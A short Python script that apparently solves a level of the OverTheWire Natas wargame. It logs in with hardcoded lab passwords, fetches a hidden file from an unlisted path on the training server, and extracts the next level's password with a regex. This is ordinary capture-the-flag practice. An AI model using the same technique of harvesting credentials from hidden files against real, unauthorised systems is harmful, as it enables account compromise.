import os, sys
import requests
import re

#password = Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

user='natas3'
password = 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14'
url = 'http://'+user+'.natas.labs.overthewire.org'

#specific url for the challenge
newUrl = 'http://'+user+'.natas.labs.overthewire.org/s3cr3t/users.txt'
website = requests.get(newUrl, auth=(user,password))
response = website.text

print (response)

foundPasswords = re.findall('natas4(.*)', response)
for p in range(len(foundPasswords)):
    print(foundPasswords[p])
